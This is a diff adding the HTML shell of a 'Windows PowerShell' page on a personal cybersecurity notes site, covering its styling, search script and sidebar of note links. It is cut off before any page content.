@@ -1,0 +1,1406 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="Personal cybersecurity notes, writeups, and reference vault"><title>Windows PowerShell — CyberHacks</title><link rel="stylesheet" href="/styles/global.css"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><style>.site-header{position:sticky;top:0;z-index:100;height:56px;background:#09070fed;backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}.header-inner{display:flex;align-items:center;gap:2rem;height:100%;padding:0 1.5rem}.logo{display:flex;align-items:center;gap:.5rem;color:var(--text);font-family:var(--font-display);font-weight:800;font-size:1.1rem;text-decoration:none;flex-shrink:0;letter-spacing:-.02em}.logo-icon{color:var(--purple-3)}.logo:hover{color:var(--purple-1)}.header-nav{display:flex;align-items:center;gap:.2rem}.nav-link{color:var(--text-muted);font-size:.78rem;font-weight:500;letter-spacing:.06em;text-transform:uppercase;padding:.35rem .7rem;border-radius:6px;text-decoration:none;transition:color .15s,background .15s;position:relative}.nav-link:hover{color:var(--purple-1);background:var(--surface)}.nav-link.active{color:var(--purple-2);background:var(--surface)}.nav-link.active:after{content:"";position:absolute;bottom:-1px;left:.7rem;right:.7rem;height:2px;background:var(--purple-3);border-radius:2px 2px 0 0}.hdr-search{position:relative;flex-shrink:0}.hdr-search-box{display:flex;align-items:center;gap:.4rem;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:.28rem .6rem;width:210px;transition:border-color .15s;cursor:text}.hdr-search-box:focus-within{border-color:var(--purple-3)}#hdr-input{background:transparent;border:none;outline:none;color:var(--text);font-size:.8rem;font-family:var(--font-sans);width:100%}#hdr-input::placeholder{color:var(--text-dim)}.hdr-search-box kbd{font-size:.58rem;background:var(--surface-2);border:1px solid var(--border-2);border-radius:4px;padding:.1rem .3rem;color:var(--text-dim);flex-shrink:0}.hdr-dropdown{position:absolute;top:calc(100% + 6px);right:0;width:380px;background:#0b0814fa;border:1px solid var(--border-2);border-radius:10px;box-shadow:0 20px 60px #000000b3;padding:.35rem;z-index:999}#hdr-results{display:flex;flex-direction:column;gap:.25rem;max-height:420px;overflow-y:auto;overflow-x:hidden;scrollbar-width:thin;scrollbar-color:var(--border-2) transparent}#hdr-results::-webkit-scrollbar{width:3px}#hdr-results::-webkit-scrollbar-track{background:transparent}#hdr-results::-webkit-scrollbar-thumb{background:var(--border-2);border-radius:3px}#hdr-results::-webkit-scrollbar-thumb:hover{background:var(--purple-3)}.hdr-result{display:block;padding:.6rem .75rem;background:#140f22cc;border:1px solid rgba(42,32,64,.9);border-radius:8px;text-decoration:none;transition:background .15s,border-color .15s,transform .15s;cursor:pointer;overflow:hidden}.hdr-result:hover{background:#5a3db833;border-color:var(--purple-3);transform:translate(2px);pointer-events:auto}.hdr-result-title{font-size:.82rem;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;line-height:1.3;margin-bottom:.2rem}.hdr-result:hover .hdr-result-title{color:var(--purple-1)}.hdr-result-path{font-size:.62rem;color:var(--text-dim);text-transform:capitalize;letter-spacing:.02em}.hdr-result-path span{color:var(--purple-3);font-weight:700;letter-spacing:.08em;text-transform:uppercase;font-size:.58rem}.hdr-empty{padding:1rem;text-align:center;color:var(--text-dim);font-size:.76rem}.hdr-view-all{display:block;margin-top:.3rem;padding:.45rem .75rem;background:#140f2280;border:1px solid var(--border);border-radius:7px;font-size:.7rem;color:var(--text-muted);text-align:center;text-decoration:none;transition:color .15s,border-color .15s;flex-shrink:0}.hdr-view-all:hover{color:var(--purple-2);border-color:var(--purple-3);background:#140f2280;transform:none}.hdr-result-excerpt{font-size:.62rem;color:var(--text-muted);line-height:1.35;margin-top:.25rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}.hdr-result-excerpt mark{background:#7c5ce84d;color:var(--purple-1);border-radius:2px;padding:0 2px;font-style:normal}@media(max-width:768px){.header-nav,.hdr-search-box kbd{display:none}.hdr-dropdown{width:calc(100vw - 2rem);right:-.5rem}}
+</style><link rel="stylesheet" href="/_astro/_..CUfV36Wy.css"></head> <body> <div class="bg-gradient"></div> <div class="bg-noise"></div> <div class="bg-grid"></div> <div class="site-wrap">  <header class="site-header"> <div class="header-inner"> <a href="/" class="logo"> <span class="logo-icon">⬡</span> <span class="logo-text">CyberHacks</span> </a> <nav class="header-nav"> <a href="/knowledge" class="nav-link active"> Knowledge </a><a href="/techniques" class="nav-link "> Techniques </a><a href="/playbooks" class="nav-link "> Playbooks </a><a href="/tools" class="nav-link "> Tools </a><a href="/resources" class="nav-link "> Resources </a><a href="/labs" class="nav-link "> Labs </a> </nav> <div class="hdr-search" id="hdr-search"> <div class="hdr-search-box"> <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="color:var(--text-dim);flex-shrink:0"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.35-4.35"></path></svg> <input id="hdr-input" type="text" placeholder="Search notes..." autocomplete="off" spellcheck="false"> <kbd>⌘K</kbd> </div> <div class="hdr-dropdown" id="hdr-dropdown" style="display:none"> <div id="hdr-results"></div> <a id="hdr-all" href="/search" class="hdr-view-all">View all results →</a> </div> </div> </div> </header>  <script>
+(function(){
+  let pf = null;
+  let timer = null;
+  const input = document.getElementById('hdr-input');
+  const dropdown = document.getElementById('hdr-dropdown');
+  const results = document.getElementById('hdr-results');
+  const viewAll = document.getElementById('hdr-all');
+  if(!input) return;
+
+  async function init() {
+    if(pf) return pf;
+    try {
+      pf = await import('/pagefind/pagefind.js');
+      await pf.init();
+    } catch(e){ pf=null; }
+    return pf;
+  }
+
+  input.addEventListener('focus', init);
+
+  input.addEventListener('input', ()=>{
+    clearTimeout(timer);
+    timer = setTimeout(async ()=>{
+      const q = input.value.trim();
+      if(!q){ dropdown.style.display='none'; return; }
+
+      const lib = await init();
+      if(!lib){
+        results.innerHTML = '<div class="hdr-empty">Run a build to enable search.</div>';
+        dropdown.style.display='block';
+        return;
+      }
+
+      const res = await lib.search(q);
+      const top = await Promise.all(res.results.slice(0,5).map(r=>r.data()));
+      viewAll.href = '/search?q='+encodeURIComponent(q);
+
+      if(!top.length){
+        results.innerHTML = '<div class="hdr-empty">No results for "'+q+'"</div>';
+      } else {
+        results.innerHTML = top.map(r=>{
+          const parts = r.url.split('/').filter(Boolean);
+          const cat = parts[0]||'';
+          const sub = parts.length>2 ? parts[1].replace(/-/g,' ') : '';
+          const title = (r.meta&&r.meta.title||'')
+            .replace(/\s*[—–-]+\s*CyberHacks\s*$/i,'').trim()
+            || parts[parts.length-1].replace(/-/g,' ');
+          const path = sub ? `<span>${cat}</span> / ${sub}` : `<span>${cat}</span>`;
+          const excerpt = (r.excerpt||'')
+            .replace(/<(?!\/?mark)[^>]+>/g,'')
+            .replace(/\s+/g,' ')
+            .replace(/^[\s\/\-–—]+/,'')
+            .trim()
+            .slice(0,90);
+          return '<a href="'+r.url+'" class="hdr-result">'
+            +'<div class="hdr-result-title">'+title+'</div>'
+            +'<div class="hdr-result-path">'+path+'</div>'
+            +(excerpt?'<div class="hdr-result-excerpt">'+excerpt+'</div>':'')
+            +'</a>';
+        }).join('');
+      }
+      dropdown.style.display='block';
+    }, 180);
+  });
+
+  document.addEventListener('click', e=>{
+    if(!document.getElementById('hdr-search').contains(e.target))
+      dropdown.style.display='none';
+  });
+
+  document.addEventListener('keydown', e=>{
+    if((e.metaKey||e.ctrlKey)&&e.key==='k'){
+      e.preventDefault(); input.focus(); input.select();
+    }
+    if(e.key==='Escape'){ dropdown.style.display='none'; input.blur(); }
+    if(e.key==='Enter'&&dropdown.style.display!=='none'&&input.value.trim())
+      window.location.href='/search?q='+encodeURIComponent(input.value.trim());
+  });
+})();
+</script> <div class="note-shell" data-astro-cid-o5gmpz7g> <aside class="sidebar" id="sidebar" data-astro-cid-o5gmpz7g> <div class="sidebar-inner" data-astro-cid-o5gmpz7g> <nav class="sidebar-nav" data-astro-cid-o5gmpz7g> <nav class="sidebar-tree" data-astro-cid-gvqsdny3> <div class="cat-group" data-open="true" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge" class="cat-label-link active" data-astro-cid-gvqsdny3> Knowledge </a> <span class="cat-count" data-astro-cid-gvqsdny3>91</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Artificial%20Intelligence" class="subcat-label-link " data-astro-cid-gvqsdny3> Artificial Intelligence </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/artificial-intelligence/ai-ml-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> AI ML Fundamentals </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Core%20Security%20Concepts" class="subcat-label-link " data-astro-cid-gvqsdny3> Core Security Concepts </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/core-security-concepts/cyber-kill-chain" class="nav-note " data-astro-cid-gvqsdny3> Cyber Kill Chain </a><a href="/knowledge/core-security-concepts/ddos" class="nav-note " data-astro-cid-gvqsdny3> DDoS </a><a href="/knowledge/core-security-concepts/insider-threat" class="nav-note " data-astro-cid-gvqsdny3> Insider Threat </a><a href="/knowledge/core-security-concepts/mitre-attck-framework" class="nav-note " data-astro-cid-gvqsdny3> MITRE ATTCK Framework </a><a href="/knowledge/core-security-concepts/osint" class="nav-note " data-astro-cid-gvqsdny3> OSINT </a><a href="/knowledge/core-security-concepts/ransomware" class="nav-note " data-astro-cid-gvqsdny3> Ransomware </a><a href="/knowledge/core-security-concepts/security-domains" class="nav-note " data-astro-cid-gvqsdny3> Security Domains </a><a href="/knowledge/core-security-concepts/security-principles" class="nav-note " data-astro-cid-gvqsdny3> Security Principles </a><a href="/knowledge/core-security-concepts/social-engineering" class="nav-note " data-astro-cid-gvqsdny3> Social Engineering </a><a href="/knowledge/core-security-concepts/threat-actors" class="nav-note " data-astro-cid-gvqsdny3> Threat Actors </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Cryptography" class="subcat-label-link " data-astro-cid-gvqsdny3> Cryptography </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/cryptography/cryptography-basics" class="nav-note " data-astro-cid-gvqsdny3> Cryptography Basics </a><a href="/knowledge/cryptography/hashing-basics" class="nav-note " data-astro-cid-gvqsdny3> Hashing Basics </a><a href="/knowledge/cryptography/public-key-basics" class="nav-note " data-astro-cid-gvqsdny3> Public Key Basics </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Defensive%20Security" class="subcat-label-link " data-astro-cid-gvqsdny3> Defensive Security </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/defensive-security/defensive-security-intro" class="nav-note " data-astro-cid-gvqsdny3> Defensive Security Intro </a><a href="/knowledge/defensive-security/digital-forensics-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Digital Forensics Fundamentals </a><a href="/knowledge/defensive-security/incident-response-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Incident Response Fundamentals </a><a href="/knowledge/defensive-security/log-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Log Fundamentals </a><a href="/knowledge/defensive-security/network-traffic-analysis" class="nav-note " data-astro-cid-gvqsdny3> Network Traffic Analysis </a><a href="/knowledge/defensive-security/soc-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> SOC Fundamentals </a><a href="/knowledge/defensive-security/threat-hunting" class="nav-note " data-astro-cid-gvqsdny3> Threat Hunting </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Security%20Solutions" class="subcat-label-link " data-astro-cid-gvqsdny3> Security Solutions </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/defensive-security/security-solutions/intro-to-siem" class="nav-note " data-astro-cid-gvqsdny3> Intro To SIEM </a><a href="/knowledge/defensive-security/security-solutions/intrusion-detection-systems-ids" class="nav-note " data-astro-cid-gvqsdny3> Intrusion Detection Systems IDS </a><a href="/knowledge/defensive-security/security-solutions/siem-use-case-development" class="nav-note " data-astro-cid-gvqsdny3> SIEM Use Case Development </a><a href="/knowledge/defensive-security/security-solutions/vulnerability-scanners" class="nav-note " data-astro-cid-gvqsdny3> Vulnerability Scanners </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Foundational%20Cs" class="subcat-label-link " data-astro-cid-gvqsdny3> Foundational Cs </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/foundational-cs/arm-processor-architecture" class="nav-note " data-astro-cid-gvqsdny3> ARM Processor Architecture </a><a href="/knowledge/foundational-cs/cpu-architecture" class="nav-note " data-astro-cid-gvqsdny3> CPU Architecture </a><a href="/knowledge/foundational-cs/data-representation" class="nav-note " data-astro-cid-gvqsdny3> Data Representation </a><a href="/knowledge/foundational-cs/input-and-output" class="nav-note " data-astro-cid-gvqsdny3> Input And Output </a><a href="/knowledge/foundational-cs/memory-architecture" class="nav-note " data-astro-cid-gvqsdny3> Memory Architecture </a><a href="/knowledge/foundational-cs/multi-processing" class="nav-note " data-astro-cid-gvqsdny3> Multi Processing </a><a href="/knowledge/foundational-cs/x86-architecture" class="nav-note " data-astro-cid-gvqsdny3> X86 Architecture </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Networking" class="subcat-label-link " data-astro-cid-gvqsdny3> Networking </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/networking/data-transmission-methods" class="nav-note " data-astro-cid-gvqsdny3> Data Transmission Methods </a><a href="/knowledge/networking/dns-domain-name-system" class="nav-note " data-astro-cid-gvqsdny3> DNS Domain Name System </a><a href="/knowledge/networking/firewalls" class="nav-note " data-astro-cid-gvqsdny3> Firewalls </a><a href="/knowledge/networking/ftp" class="nav-note " data-astro-cid-gvqsdny3> FTP </a><a href="/knowledge/networking/http-https" class="nav-note " data-astro-cid-gvqsdny3> HTTP HTTPS </a><a href="/knowledge/networking/imap-pop3" class="nav-note " data-astro-cid-gvqsdny3> IMAP POP3 </a><a href="/knowledge/networking/ip-addressing" class="nav-note " data-astro-cid-gvqsdny3> IP Addressing </a><a href="/knowledge/networking/ipmi" class="nav-note " data-astro-cid-gvqsdny3> IPMI </a><a href="/knowledge/networking/lan-topologies" class="nav-note " data-astro-cid-gvqsdny3> LAN Topologies </a><a href="/knowledge/networking/mssql" class="nav-note " data-astro-cid-gvqsdny3> MSSQL </a><a href="/knowledge/networking/mysql" class="nav-note " data-astro-cid-gvqsdny3> MySQL </a><a href="/knowledge/networking/network-media-connections" class="nav-note " data-astro-cid-gvqsdny3> Network Media Connections </a><a href="/knowledge/networking/networking-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Networking Fundamentals </a><a href="/knowledge/networking/nfs" class="nav-note " data-astro-cid-gvqsdny3> NFS </a><a href="/knowledge/networking/oracle-tns" class="nav-note " data-astro-cid-gvqsdny3> Oracle TNS </a><a href="/knowledge/networking/osi-model" class="nav-note " data-astro-cid-gvqsdny3> OSI Model </a><a href="/knowledge/networking/packets-and-frames" class="nav-note " data-astro-cid-gvqsdny3> Packets And Frames </a><a href="/knowledge/networking/ports" class="nav-note " data-astro-cid-gvqsdny3> Ports </a><a href="/knowledge/networking/protocols" class="nav-note " data-astro-cid-gvqsdny3> Protocols </a><a href="/knowledge/networking/smb" class="nav-note " data-astro-cid-gvqsdny3> SMB </a><a href="/knowledge/networking/smtp" class="nav-note " data-astro-cid-gvqsdny3> SMTP </a><a href="/knowledge/networking/snmp" class="nav-note " data-astro-cid-gvqsdny3> SNMP </a><a href="/knowledge/networking/subnetting" class="nav-note " data-astro-cid-gvqsdny3> Subnetting </a><a href="/knowledge/networking/tls-ssl" class="nav-note " data-astro-cid-gvqsdny3> TLS SSL </a><a href="/knowledge/networking/vpn-basics" class="nav-note " data-astro-cid-gvqsdny3> VPN Basics </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Offensive%20Security" class="subcat-label-link " data-astro-cid-gvqsdny3> Offensive Security </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/offensive-security/footprinting-enumeration" class="nav-note " data-astro-cid-gvqsdny3> Footprinting Enumeration </a><a href="/knowledge/offensive-security/offensive-security-intro" class="nav-note " data-astro-cid-gvqsdny3> Offensive Security Intro </a><a href="/knowledge/offensive-security/pentesting-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Pentesting Fundamentals </a><a href="/knowledge/offensive-security/web-reconnaissance" class="nav-note " data-astro-cid-gvqsdny3> Web Reconnaissance </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Operating%20Systems" class="subcat-label-link " data-astro-cid-gvqsdny3> Operating Systems </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/boot-and-file-systems" class="nav-note " data-astro-cid-gvqsdny3> Boot And File Systems </a><a href="/knowledge/operating-systems/containerization" class="nav-note " data-astro-cid-gvqsdny3> Containerization </a><a href="/knowledge/operating-systems/operating-system-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Operating System Fundamentals </a><a href="/knowledge/operating-systems/operating-system-internals" class="nav-note " data-astro-cid-gvqsdny3> Operating System Internals </a><a href="/knowledge/operating-systems/solaris" class="nav-note " data-astro-cid-gvqsdny3> Solaris </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Linux" class="subcat-label-link " data-astro-cid-gvqsdny3> Linux </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/linux/linux-file-system" class="nav-note " data-astro-cid-gvqsdny3> Linux File System </a><a href="/knowledge/operating-systems/linux/linux-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Linux Fundamentals </a><a href="/knowledge/operating-systems/linux/linux-hardening" class="nav-note " data-astro-cid-gvqsdny3> Linux Hardening </a><a href="/knowledge/operating-systems/linux/linux-networking" class="nav-note " data-astro-cid-gvqsdny3> Linux Networking </a><a href="/knowledge/operating-systems/linux/linux-shells" class="nav-note " data-astro-cid-gvqsdny3> Linux Shells </a><a href="/knowledge/operating-systems/linux/linux-system-management" class="nav-note " data-astro-cid-gvqsdny3> Linux System Management </a><a href="/knowledge/operating-systems/linux/shell-scripting" class="nav-note " data-astro-cid-gvqsdny3> Shell Scripting </a> </div> </div><div class="subcat-group" data-open="true" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Windows" class="subcat-label-link active" data-astro-cid-gvqsdny3> Windows </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/windows/event-tracing-for-windows-etw" class="nav-note " data-astro-cid-gvqsdny3> Event Tracing For Windows ETW </a><a href="/knowledge/operating-systems/windows/windows-command-line" class="nav-note " data-astro-cid-gvqsdny3> Windows Command Line </a><a href="/knowledge/operating-systems/windows/windows-event-logs" class="nav-note " data-astro-cid-gvqsdny3> Windows Event Logs </a><a href="/knowledge/operating-systems/windows/windows-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> Windows Fundamentals </a><a href="/knowledge/operating-systems/windows/windows-powershell" class="nav-note active" data-astro-cid-gvqsdny3> Windows PowerShell </a><a href="/knowledge/operating-systems/windows/windows-remote-management" class="nav-note " data-astro-cid-gvqsdny3> Windows Remote Management </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Active%20Directory" class="subcat-label-link " data-astro-cid-gvqsdny3> Active Directory </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/operating-systems/windows/active-directory/active-directory-basics" class="nav-note " data-astro-cid-gvqsdny3> Active Directory Basics </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/knowledge?filter=Web%20Security" class="subcat-label-link " data-astro-cid-gvqsdny3> Web Security </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/knowledge/web-security/certificate-transparency-logs" class="nav-note " data-astro-cid-gvqsdny3> Certificate Transparency Logs </a><a href="/knowledge/web-security/javascript-essentials" class="nav-note " data-astro-cid-gvqsdny3> JavaScript Essentials </a><a href="/knowledge/web-security/owasp-top-10---2021" class="nav-note " data-astro-cid-gvqsdny3> OWASP Top 10   2021 </a><a href="/knowledge/web-security/sql-fundamentals" class="nav-note " data-astro-cid-gvqsdny3> SQL Fundamentals </a><a href="/knowledge/web-security/virtual-hosts" class="nav-note " data-astro-cid-gvqsdny3> Virtual Hosts </a><a href="/knowledge/web-security/web-apis" class="nav-note " data-astro-cid-gvqsdny3> Web APIs </a><a href="/knowledge/web-security/web-application-proxies" class="nav-note " data-astro-cid-gvqsdny3> Web Application Proxies </a><a href="/knowledge/web-security/web-crawling" class="nav-note " data-astro-cid-gvqsdny3> Web Crawling </a><a href="/knowledge/web-security/web-fingerprinting" class="nav-note " data-astro-cid-gvqsdny3> Web Fingerprinting </a><a href="/knowledge/web-security/website-innerworkings" class="nav-note " data-astro-cid-gvqsdny3> Website Innerworkings </a><a href="/knowledge/web-security/wordpress" class="nav-note " data-astro-cid-gvqsdny3> WordPress </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/techniques" class="cat-label-link " data-astro-cid-gvqsdny3> Techniques </a> <span class="cat-count" data-astro-cid-gvqsdny3>10</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <a href="/techniques/api-fuzzing" class="nav-note " data-astro-cid-gvqsdny3> API Fuzzing </a><a href="/techniques/command-injection" class="nav-note " data-astro-cid-gvqsdny3> Command Injection </a><a href="/techniques/dns-enumeration" class="nav-note " data-astro-cid-gvqsdny3> DNS Enumeration </a><a href="/techniques/javascript-deobfuscation" class="nav-note " data-astro-cid-gvqsdny3> JavaScript Deobfuscation </a><a href="/techniques/sql-injection" class="nav-note " data-astro-cid-gvqsdny3> SQL Injection </a><a href="/techniques/subdomain-enumeration" class="nav-note " data-astro-cid-gvqsdny3> Subdomain Enumeration </a><a href="/techniques/vhost-fuzzing" class="nav-note " data-astro-cid-gvqsdny3> VHost Fuzzing </a><a href="/techniques/wordpress-attacks" class="nav-note " data-astro-cid-gvqsdny3> WordPress Attacks </a><a href="/techniques/xss" class="nav-note " data-astro-cid-gvqsdny3> XSS </a><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/techniques?filter=Cryptography%20Attacks" class="subcat-label-link " data-astro-cid-gvqsdny3> Cryptography Attacks </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/techniques/cryptography-attacks/rsa-cracking" class="nav-note " data-astro-cid-gvqsdny3> RSA Cracking </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/playbooks" class="cat-label-link " data-astro-cid-gvqsdny3> Playbooks </a> <span class="cat-count" data-astro-cid-gvqsdny3>6</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <a href="/playbooks/linux-forensics-playbook" class="nav-note " data-astro-cid-gvqsdny3> Linux Forensics Playbook </a><a href="/playbooks/linux-pentest-playbook" class="nav-note " data-astro-cid-gvqsdny3> Linux Pentest Playbook </a><a href="/playbooks/osint-playbook" class="nav-note " data-astro-cid-gvqsdny3> OSINT Playbook </a><a href="/playbooks/windows-pentest-playbook" class="nav-note " data-astro-cid-gvqsdny3> Windows Pentest Playbook </a><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/playbooks?filter=Methodologies" class="subcat-label-link " data-astro-cid-gvqsdny3> Methodologies </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/playbooks/methodologies/blue-team" class="nav-note " data-astro-cid-gvqsdny3> Blue Team </a><a href="/playbooks/methodologies/red-team" class="nav-note " data-astro-cid-gvqsdny3> Red Team </a> </div> </div> </div> </div><div class="cat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="cat-header" data-astro-cid-gvqsdny3> <button class="cat-toggle" aria-label="Toggle category" data-astro-cid-gvqsdny3> <span class="cat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools" class="cat-label-link " data-astro-cid-gvqsdny3> Tools </a> <span class="cat-count" data-astro-cid-gvqsdny3>63</span> </div> <div class="cat-body" data-astro-cid-gvqsdny3> <div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Cryptography" class="subcat-label-link " data-astro-cid-gvqsdny3> Cryptography </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/cryptography/cyberchef" class="nav-note " data-astro-cid-gvqsdny3> CyberChef </a> </div> </div><div class="subcat-group" data-open="false" data-astro-cid-gvqsdny3> <div class="subcat-header" data-astro-cid-gvqsdny3> <button class="subcat-toggle" aria-label="Toggle subcategory" data-astro-cid-gvqsdny3> <span class="subcat-chevron" data-astro-cid-gvqsdny3>▶</span> </button> <a href="/tools?filter=Defense%20Monitoring" class="subcat-label-link " data-astro-cid-gvqsdny3> Defense Monitoring </a> </div> <div class="subcat-body" data-astro-cid-gvqsdny3> <a href="/tools/defense-monitoring/elastic-stack" class="nav-note " data-astro-cid-gvqsdny3> Elastic Stack </a><a href="/tools/defense-monitoring/iptables" class="nav-note " data-astro-cid-gvqsdny3> Iptables </a><a href="/tools/defense-monitoring/silketw" class="nav-note " data-astro-cid-gvqsdny3> SilkETW </a><a href="/tools/defense-monitoring/snort" class="nav-note " data-astro-cid-gvqsdny3> Snort </a><a 